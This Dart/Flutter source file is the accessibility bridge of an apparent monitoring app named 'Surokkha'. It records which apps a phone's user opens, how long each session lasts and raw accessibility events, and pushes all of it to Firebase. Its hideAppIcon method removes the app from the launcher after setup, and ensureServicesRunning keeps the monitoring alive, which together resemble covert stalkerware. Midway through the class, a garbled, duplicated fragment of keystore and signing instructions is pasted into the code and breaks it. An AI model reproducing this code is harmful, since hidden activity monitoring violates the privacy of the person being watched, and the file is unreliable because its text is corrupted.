import 'package:flutter/services.dart';
import 'package:flutter/foundation.dart';
import 'dart:convert';
import 'package:firebase_database/firebase_database.dart';
import 'background_service.dart';

/// Bridge service to connect Android AccessibilityService with Flutter
class AccessibilityBridge {
  static final AccessibilityBridge _instance = AccessibilityBridge._internal();
  factory AccessibilityBridge() => _instance;
  AccessibilityBridge._internal();

  static const MethodChannel _channel = MethodChannel('surokkha_accessibility');
  static const String _platformChannel = 'surokkha_platform';
  
  final DatabaseReference _database = FirebaseDatabase.instance.ref();
  bool _isInitialized = false;
  String? _deviceId;
  
  /// Initialize the accessibility bridge
  Future<bool> initialize() async {
    if (_isInitialized) return true;

    try {
      // Set up method call handler for accessibility events
      _channel.setMethodCallHandler(_handleMethodCall);
      
      // Generate device ID
      _deviceId = await _generateDeviceId();
      
      // Initialize platform channel for native communication
      await _initializePlatformChannel();
      
      _isInitialized = true;
      debugPrint('✅ Accessibility Bridge initialized');
      return true;
    } catch (e) {
      debugPrint('❌ Failed to initialize Accessibility Bridge: $e');
      return false;
    }
  }

  /// Handle method calls from native Android code
  Future<dynamic> _handleMethodCall(MethodCall call) async {
    try {
      switch (call.method) {
        case 'onAccessibilityEvent':
          await _handleAccessibilityEvent(call.arguments);
          break;
        case 'onServiceStatusChanged':
          await _handleServiceStatusChanged(call.arguments);
          break;
        default:
          debugPrint('Unknown method call: ${call.method}');
      }
    } catch (e) {
      debugPrint('Error handling method call: $e');
    }
  }

  /// Handle accessibility events from native service
  Future<void> _handleAccessibilityEvent(dynamic arguments) async {
    try {
      final eventData = json.decode(arguments.toString());
      final eventType = eventData['event_type'] as String;
      
      debugPrint('📱 Accessibility Event: $eventType');
      
      // Process different event types
      switch (eventType) {
        case 'app_opened':
          await _handleAppOpened(eventData);
          break;
        case 'app_activity':
          await _handleAppActivity(eventData);
          break;
        case 'app_session_ended':
          await _handleSessionEnded(eventData);
          break;
        case 'view_focused':
          await _handleViewFocused(eventData);
          break;
        case 'service_connected':
          await _handleServiceConnected(eventData);
          break;
        case 'service_interrupted':
          await _handleServiceInterrupted(eventData);
          break;
      }
      
      // Send to Firebase Realtime Database
      await _sendEventToFirebase(eventType, eventData);
      
    } catch (e) {
      debugPrint('❌ Error handling accessibility event: $e');
    }
  }

  /// Handle app opened events
  Future<void> _handleAppOpened(Map<String, dynamic> eventData) async {
    final packageName = eventData['package_name'] as String;
    final appName = eventData['app_name'] as String;
    final timestamp = eventData['timestamp'] as int;
    
    debugPrint('📱 App Opened: $appName ($packageName)');
    
    // Update background service notification
    final backgroundService = BackgroundService();
    await backgroundService.updateNotification(
      title: 'Surokkha Security Active',
      text: 'Monitoring: $appName',
    );
    
    // Store app usage data
    await _storeAppUsageData(packageName, appName, 'opened', timestamp);
  }

  /// Handle app activity events
  Future<void> _handleAppActivity(Map<String, dynamic> eventData) async {
    final packageName = eventData['package_name'] as String;
    final timestamp = eventData['timestamp'] as int;
    
    // Log activity without sensitive data
    await _storeAppUsageData(packageName, null, 'activity', timestamp);
  }

  /// Handle session ended events
  Future<void> _handleSessionEnded(Map<String, dynamic> eventData) async {
    final packageName = eventData['package_name'] as String;
    final sessionDuration = eventData['session_duration'] as int;
    final timestamp = eventData['timestamp'] as int;
    
    debugPrint('⏱️ Session Ended: $packageName, Duration: ${sessionDuration}ms');
    
    // Store session data
    await _storeSessionData(packageName, sessionDuration, timestamp);
  }

  /// Handle view focused events
  Future<void> _handleViewFocused(Map<String, dynamic> eventData) async {
    final packageName = eventData['package_name'] as String;
    final timestamp = eventData['timestamp'] as int;
    
    // Log focus events for usage analytics
    await _storeAppUsageData(packageName, null, 'focused', timestamp);
  }

  /// Handle service connected events
  Future<void> _handleServiceConnected(Map<String, dynamic> eventData) async {
    debugPrint('✅ Accessibility Service Connected');
    
    // Update device status in Firebase
    if (_deviceId != null) {
      await _database.child('devices').child(_deviceId!).update({
        'accessibilityService': {
          'status': 'CONNECTED',
          'connectedAt': ServerValue.timestamp,
          'monitoredApps': eventData['monitored_apps'] ?? 0,
        }
      });
    }
  }

  /// Handle service interrupted events
  Future<void> _handleServiceInterrupted(Map<String, dynamic> eventData) async {
    debugPrint('⚠️ Accessibility Service Interrupted');
    
    // Update device status in Firebase
    if (_deviceId != null) {
      await _database.child('devices').child(_deviceId!).update({
        'accessibilityService': {
          'status': 'INTERRUPTED',
          'interruptedAt': ServerValue.timestamp,
        }
      });
    }
  }

  /// Handle service status changes
  Future<void> _handleServiceStatusChanged(dynamic arguments) async {
    final statusData = json.decode(arguments.toString());
    debugPrint('🔄 Service Status Changed: ${statusData['status']}');
    
    // Update Firebase with service status
    await _sendEventToFirebase('service_status_changed', statusData);
  }

  /// Store app usage data in Firebase
  Future<void> _storeAppUsageData(String packageName, String? appName, String eventType, int timestamp) async {
    if (_deviceId == null) return;

    try {
      final usageData = {
        'packageName': packageName,
        'appName': appName,
        'eventType': eventType,
        'timestamp': timestamp,
        'serverTimestamp': ServerValue.timestamp,
      };

      await _database
          .child('devices')
          .child(_deviceId!)
          .child('appUsage')
          .child(packageName)
          .child('events')
          .push()
          .set(usageData);
    } catch (e) {
      debugPrint('❌ Error storing app usage data: $e');
    }
  }

  /// Store session data in Firebase
  Future<void> _storeSessionData(String packageName, int duration, int timestamp) async {
    if (_deviceId == null) return;

    try {
      final sessionData = {
        'packageName': packageName,
        'duration': duration,
        'endTime': timestamp,
        'serverTimestamp': ServerValue.timestamp,
      };

      await _database
          .child('devices')
          .child(_deviceId!)
          .child('appUsage')
          .child(packageName)
          .child('sessions')
          .push()
          .set(sessionData);

      // Update total usage statistics
      await _updateUsageStatistics(packageName, duration);
    } catch (e) {
      debugPrint('❌ Error storing session data: $e');
    }
  }

  /// Update usage statistics
  Future<void> _updateUsageStatistics(String packageName, int sessionDuration) async {
    if (_deviceId == null) return;

    try {
      final statsRef = _database
          .child('devices')
          .child(_deviceId!)
          .child('appUsage')
          .child(packageName)
          .child('statistics');

      final snapshot = await statsRef.get();
      final currentStats = snapshot.value as Map<String, dynamic>? ?? {};

      final totalTime = (currentStats['totalTime'] as int? ?? 0) + sessionDuration;
      final sessionCount = (currentStats['sessionCount'] as int? ?? 0) + 1;
      final averageSessionTime = totalTime ~/ sessionCount;

      await statsRef.set({
        'totalTime': totalTime,
        'sessionCount': sessionCount,
        'averageSessionTime': averageSessionTime,
        'lastUpdated': ServerValue.timestamp,
      });
    } catch (e) {
      debugPrint('❌ Error updating usage statistics: $e');
    }
  }

  /// Send event to Firebase Realtime Database
  Future<void> _sendEventToFirebase(String eventType, Map<String, dynamic> eventData) async {
    if (_deviceId == null) return;

    try {
      final firebaseData = {
        'eventType': eventType,
        'timestamp': eventData['timestamp'],
        'serverTimestamp': ServerValue.timestamp,
        'data': eventData,
      };

      await _database
          .child('devices')
          .child(_deviceId!)
          .child('accessibilityEvents')
          .push()
          .set(firebaseData);
    } catch (e) {
      debugPrint('❌ Error sending event to Firebase: $e');
    }
  }

  /// Initialize platform channel for native communication
  Future<void> _initializePlatformChannel() async {
    const platform = MethodChannel(_platformChannel);
    
    try {
      // Set up accessibility service reference in native code
      await platform.invokeMethod('initializeAccessibilityBridge');
      debugPrint('✅ Platform channel initialized');
    } catch (e) {
      debugPrint('❌ Error initializing platform channel: $e');
    }
  }

  /// Generate device ID
  Future<String> _generateDeviceId() async {
    final timestamp = DateTime.now().millisecondsSinceEpoch;
    return 'ACCESSIBILITY_${timestamp}_${timestamp.hashCode.abs()}';
  }

  /// Check if accessibility service is enabled
  Future<bool> isAccessibilityServiceEnabled() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('isAccessibilityServiceEnabled');
      return result as bool? ?? false;
    } catch (e) {
      debugPrint('❌ Error checking accessibility service status: $e');
      return false;
    }
  }

  /// Request accessibility service permission
  Future<bool> requestAccessibilityPermission() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('requestAccessibilityPermission');
      return result as bool? ?? false;
    } catch (e) {
      debugPrint('❌ Error requesting accessibility permission: $e');
      return false;
    }
  }

  /// Get usage statistics from native service
  Future<Map<String, dynamic>?> getUsageStatistics() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('getUsageStatistics');
      return Map<String, dynamic>.from(result ?? {});
    } catch (e) {
      debugPrint('❌ Error getting usage statistics: $e');
      return null;
    }
  }Create hanet-release-key.jks -keyalg RSA -keystore surokkhanet-release-key.jks -keyalg RSA -keysize 204.jks` file to `android/app/`.  
  Updat  
  Move the `.jks` file to `android/app/`.  
  Update `android/app/build.gradle`: add `signingConfigs` block with the keystorease`, set `signingConfig signingConfiildTypes.rees.nable `minifyEnabled true` and add ProGuard rules.nable `minifyEnabled true` and add ProGuard rules.`

  /// Hide app icon from launcher after successful setup
  Future<bool> hideAppIcon() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('hideAppIcon');
      
      if (result == true) {
        debugPrint('✅ App icon hidden successfully');
        
        // Log the action in Firebase
        if (_deviceId != null) {
          await _database.child('devices').child(_deviceId!).update({
            'appIcon': {
              'hidden': true,
              'hiddenAt': ServerValue.timestamp,
              'reason': 'successful_setup_completion'
            }
          });
        }
        
        return true;
      } else {
        debugPrint('❌ Failed to hide app icon');
        return false;
      }
    } catch (e) {
      debugPrint('❌ Error hiding app icon: $e');
      return false;
    }
  }

  /// Show app icon (restore visibility)
  Future<bool> showAppIcon() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('showAppIcon');
      
      if (result == true) {
        debugPrint('✅ App icon restored successfully');
        
        // Log the action in Firebase
        if (_deviceId != null) {
          await _database.child('devices').child(_deviceId!).update({
            'appIcon': {
              'hidden': false,
              'restoredAt': ServerValue.timestamp,
              'reason': 'manual_restore'
            }
          });
        }
        
        return true;
      } else {
        debugPrint('❌ Failed to show app icon');
        return false;
      }
    } catch (e) {
      debugPrint('❌ Error showing app icon: $e');
      return false;
    }
  }

  /// Check if app icon is currently hidden
  Future<bool> isAppIconHidden() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('isAppIconHidden');
      return result as bool? ?? false;
    } catch (e) {
      debugPrint('❌ Error checking app icon status: $e');
      return false;
    }
  }

  /// Ensure services are running (restart if needed)
  Future<bool> ensureServicesRunning() async {
    try {
      const platform = MethodChannel(_platformChannel);
      final result = await platform.invokeMethod('ensureServicesRunning');
      
      if (result == true) {
        debugPrint('✅ Services are running or restarted successfully');
        return true;
      } else {
        debugPrint('❌ Failed to ensure services are running');
        return false;
      }
    } catch (e) {
      debugPrint('❌ Error ensuring services are running: $e');
      return false;
    }
  }

  /// Dispose resources
  void dispose() {
    _isInitialized = false;
    debugPrint('🧹 Accessibility Bridge disposed');
  }
}
